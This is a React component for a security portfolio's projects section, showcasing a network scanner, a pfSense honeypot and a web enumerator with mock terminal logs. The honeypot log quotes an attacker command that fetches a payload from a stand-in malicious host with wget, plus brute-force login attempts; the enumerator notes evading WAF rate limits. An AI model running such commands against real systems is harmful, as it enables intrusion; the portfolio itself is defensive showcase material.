import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Target, ShieldAlert, Globe, Terminal, ChevronDown, ChevronUp } from 'lucide-react';
import { GithubIcon } from './Icons';

const projectsData = [
  {
    id: 'sn1p3rnetx',
    title: 'Sn1p3rNetX',
    subtitle: 'AI-Powered Network Risk Intelligence',
    date: 'July 2025',
    icon: Target,
    themeColor: 'cyan',
    glassClass: 'glass-panel-cyan',
    glowColor: 'shadow-[0_4px_24px_rgba(0,0,0,0.6)]',
    tagColor: 'bg-cyan-950 text-cyan-400 border-cyan-800/30',
    description:
      'Modular Python network reconnaissance tool integrating Nmap scanning with Groq Llama-3.3-70B AI to deliver contextual security insights, CVE enrichment, and automated risk scoring.',
    github: 'https://github.com/HarisaranS/Sn1p3rNetX',
    tags: ['Python', 'Nmap', 'LLM Integration', 'CVE Enrichment', 'CLI Tooling'],
    details:
      'Engineered a production-ready CLI using the Rich library for interactive UIs, with scan results persisted to a local SQLite database. Multiformat report exports (JSON/PDF) enable security teams to share threat vectors easily.',
    terminalLogs: [
      'root@sn1p3rnetx:~$ sn1p3rnetx --target 192.168.1.77 --ai-enrich',
      '[*] Initializing modular scanner...',
      '[*] Launching Nmap service profiling on 192.168.1.77...',
      '[+] Found: Port 22/tcp (SSH - OpenSSH 8.2p1)',
      '[+] Found: Port 80/tcp (HTTP - Apache 2.4.41)',
      '[*] Querying NIST Vulnerability API & Vulners Database...',
      '[!] Match found for OpenSSH 8.2p1: CVE-2020-15778 (CVSS 7.8)',
      '[*] Dispatching payload parameters to Llama-3.3-70B...',
      '[+] AI Analysis Completed.',
      '-------------------------------------------------------',
      '[!] RISKSCORE: 7.9 [HIGH RISK]',
      '[!] RECOMMENDATION: Update OpenSSH to >= 8.9p1; disable password auth.',
      '-------------------------------------------------------',
      '[+] Scan saved to SQLite db. JSON report generated at report_192.168.1.77.json',
    ],
  },
  {
    id: 'honeypot',
    title: 'pfSense Protected Honeypot',
    subtitle: 'DMZ Security Simulation & Analysis',
    date: 'January 2026',
    icon: ShieldAlert,
    themeColor: 'purple',
    glassClass: 'glass-panel-purple',
    glowColor: 'shadow-[0_4px_24px_rgba(0,0,0,0.6)]',
    tagColor: 'bg-purple-950 text-purple-400 border-purple-800/30',
    description:
      'Virtualized DMZ honeypot architecture using pfSense and Ubuntu to simulate vulnerable services, isolate production networks, and capture real-world attack vectors.',
    github: 'https://github.com/HarisaranS/DMZ-Honeypot',
    tags: ['pfSense', 'Honeypot', 'Network Security', 'Threat Intelligence'],
    details:
      'Simulated standard services (SSH, FTP, HTTP) within the DMZ to attract adversaries. Designed custom Python collectors that parsed syslog feeds, capturing credential attempts and logging source IPs for automated blocklists.',
    terminalLogs: [
      'root@pfsense-gateway:~$ tail -f /var/log/honeypot/alerts.log',
      '[2026-07-23T15:01:12] ALERT: SSH connection attempt from 185.220.101.44 (Tor exit)',
      '[2026-07-23T15:01:15] SSH BRUTEFORCE: user "root", pass "admin123" [FAILED]',
      '[2026-07-23T15:01:18] SSH BRUTEFORCE: user "admin", pass "password" [FAILED]',
      '[2026-07-23T15:01:21] SSH BRUTEFORCE: user "support", pass "support" [FAILED]',
      '[2026-07-23T15:01:22] SHELL EXPLOITATION ATTEMPT: "cd /tmp; wget http://malicious.ru/elf"',
      '[!] CRITICAL: Credential harvesting logged. Source IP metadata cataloged.',
      '[*] pfSense Firewall rule triggered: IP 185.220.101.44 added to threat-intel alias.',
      '[*] ROUTE BLOCKED: Adversary isolated from local subnets.',
    ],
  },
  {
    id: 'bswebenum',
    title: 'BsWebEnum',
    subtitle: 'Automated Web Directory Discoverer',
    date: 'January 2026',
    icon: Globe,
    themeColor: 'green',
    glassClass: 'glass-panel-green',
    glowColor: 'shadow-[0_4px_24px_rgba(0,0,0,0.6)]',
    tagColor: 'bg-emerald-950 text-emerald-400 border-emerald-800/30',
    description:
      'Web enumeration tool that automates directory, endpoint, and hidden resource discovery on target web servers to assist in penetration testing recon.',
    github: 'https://github.com/HarisaranS/BsWebEnum',
    tags: ['Python', 'Web Enumeration', 'Recon', 'Pentesting'],
    details:
      'Multi-threaded directory scanner built with Python. Features custom headers injection, randomized User-Agent rotations to bypass basic WAF rate-limiting, and smart status code filters.',
    terminalLogs: [
      'root@bswebenum:~$ python3 bswebenum.py -u http://target.local -w common.txt -t 20',
      '[*] Scanning http://target.local with 20 threads...',
      '[*] Wordlist size: 4,612 entries.',
      '-------------------------------------------------------',
      '[200 OK] http://target.local/index.html (Size: 1.2KB)',
      '[200 OK] http://target.local/robots.txt (Size: 145B)',
      '[!] Discovered robot entry: /backup/v1/',
      '[200 OK] http://target.local/backup/v1/ (Directory Listing Enabled)',
      '[301 REDIRECT] http://target.local/admin -> /admin/ (Size: 0B)',
      '[200 OK] http://target.local/admin/config.php.bak (Size: 14KB) [CRITICAL EXPOSURE]',
      '[403 FORBIDDEN] http://target.local/server-status (Size: 220B)',
      '-------------------------------------------------------',
      '[+] Scan complete. Found 4 interesting endpoints.',
    ],
  },
];

export default function Projects() {
  const [expandedCard, setExpandedCard] = useState<string | null>(null);

  const toggleExpand = (id: string) => {
    if (expandedCard === id) {
      setExpandedCard(null);
    } else {
      setExpandedCard(id);
    }
  };

  return (
    <section id="projects" className="relative py-24 border-t border-slate-900 overflow-hidden">
      <div className="scanline" />
      
      <div className="relative z-10 w-full max-w-5xl px-6 mx-auto">
        {/* Section Header */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.6 }}
          className="mb-16 text-center"
        >
          <div className="inline-block text-cyan-400 font-mono text-xs uppercase tracking-widest px-3 py-1 rounded bg-cyan-950/20 border border-cyan-800/30 mb-3">
            03 // CENTERPIECE PROJECTS
          </div>
          <h2 className="text-3xl sm:text-4xl font-bold text-white tracking-tight">
            DEVELOPED TOOLS & ARCHITECTURES
          </h2>
          <div className="h-[1px] w-20 bg-gradient-to-r from-cyan-500 to-purple-500 mx-auto mt-4" />
        </motion.div>

        {/* Projects Layout */}
        <div className="space-y-6">
          {projectsData.map((project, idx) => {
            const isExpanded = expandedCard === project.id;
            const CardIcon = project.icon;

            return (
              <motion.div
                layout="position"
                key={project.id}
                initial={{ opacity: 0, y: 30 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ duration: 0.6, delay: idx * 0.15 }}
                className={`${project.glassClass} rounded-2xl p-6 border transition-all duration-300 ${
                  isExpanded ? project.glowColor : 'hover:border-slate-700/50'
                }`}
              >
                {/* Header Section */}
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                  <div className="flex items-start gap-4">
                    {/* Pulsing theme icon */}
                    <div
                      className={`p-3.5 rounded-xl bg-black border ${
                        project.themeColor === 'cyan'
                          ? 'border-cyan-500/30 text-cyan-400'
                          : project.themeColor === 'purple'
                          ? 'border-purple-500/30 text-purple-400'
                          : 'border-emerald-500/30 text-emerald-400'
                      }`}
                    >
                      <CardIcon className="w-6 h-6 animate-pulse" />
                    </div>

                    <div>
                      <div className="flex items-center gap-3">
                        <h3 className="text-white font-bold text-lg sm:text-xl group-hover:text-cyan-400">
                          {project.title}
                        </h3>
                        <span className="px-2 py-0.5 rounded text-[9px] font-mono bg-black text-slate-400 border border-white/5">
                          {project.date}
                        </span>
                      </div>
                      <p className="text-xs sm:text-sm font-mono text-slate-400 mt-0.5">
                        {project.subtitle}
                      </p>
                    </div>
                  </div>

                  <div className="flex items-center gap-3">
                    <a
                      href={project.github}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="p-2 rounded-lg bg-black/40 hover:bg-black border border-white/5 hover:border-white/20 text-slate-400 hover:text-white transition-all"
                      title="View GitHub Repository"
                    >
                      <GithubIcon className="w-4.5 h-4.5" />
                    </a>
                    
                    <button
                      onClick={() => toggleExpand(project.id)}
                      className={`flex items-center gap-1.5 px-4 py-2 rounded-lg font-mono text-xs border border-white/5 bg-black/40 text-slate-400 hover:text-white hover:bg-black transition-all`}
                    >
                      {isExpanded ? (
                        <>
                          COLLAPSE DETAILS <ChevronUp className="w-3.5 h-3.5" />
                        </>
                      ) : (
                        <>
                          ANALYZE SHELL <ChevronDown className="w-3.5 h-3.5" />
                        </>
                      )}
                    </button>
                  </div>
                </div>

                {/* Description Paragraph */}
                <p className="text-slate-300 text-sm leading-relaxed mt-4">
                  {project.description}
                </p>

                {/* Tech Tags */}
                <div className="flex flex-wrap gap-2 mt-4">
                  {project.tags.map((tag) => (
                    <span
                      key={tag}
                      className={`px-2.5 py-0.5 rounded-full text-xs font-mono border ${project.tagColor}`}
                    >
                      {tag}
                    </span>
                  ))}
                </div>

                {/* Expanded Details Section */}
                <AnimatePresence>
                  {isExpanded && (
                    <motion.div
                      initial={{ height: 0, opacity: 0 }}
                      animate={{ height: 'auto', opacity: 1 }}
                      exit={{ height: 0, opacity: 0 }}
                      transition={{ duration: 0.35, ease: 'easeInOut' }}
                      className="overflow-hidden"
                    >
                      <div className="mt-6 pt-6 border-t border-white/5 space-y-4">
                        <div>
                          <h4 className="font-mono text-xs text-slate-500 uppercase tracking-wider">
                            SYSTEM DESIGN & DETAILS:
                          </h4>
                          <p className="text-slate-400 text-xs sm:text-sm mt-1 leading-relaxed">
                            {project.details}
                          </p>
                        </div>

                        {/* Interactive Terminal log */}
                        <div className="rounded-xl overflow-hidden border border-slate-800 bg-[#020204]">
                          {/* Terminal Header */}
                          <div className="bg-slate-900/60 px-4 py-2 flex items-center justify-between border-b border-slate-800/80">
                            <div className="flex items-center gap-1.5">
                              <div className="w-2.5 h-2.5 rounded-full bg-red-500" />
                              <div className="w-2.5 h-2.5 rounded-full bg-yellow-500" />
                              <div className="w-2.5 h-2.5 rounded-full bg-green-500" />
                            </div>
                            <span className="font-mono text-[10px] text-slate-500 flex items-center gap-1">
                              <Terminal className="w-3 h-3" />
                              console_readout.sh
                            </span>
                          </div>

                          {/* Terminal Content */}
                          <div className="p-4 font-mono text-[10px] sm:text-xs leading-relaxed overflow-x-auto max-h-60 text-slate-300">
                            {project.terminalLogs.map((log, lIdx) => {
                              let logColor = 'text-slate-300';
                              if (log.startsWith('root@')) logColor = 'text-purple-400 font-bold';
                              else if (log.startsWith('[+]')) logColor = 'text-emerald-400 font-semibold';
                              else if (log.startsWith('[!]')) logColor = 'text-cyan-400 font-bold';
                              else if (log.startsWith('[-]')) logColor = 'text-red-400';
                              else if (log.startsWith('---')) logColor = 'text-slate-600';

                              return (
                                <div key={lIdx} className={`${logColor} whitespace-nowrap`}>
                                  {log}
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </motion.div>
            );
          })}
        </div>
      </div>
    </section>
  );
}
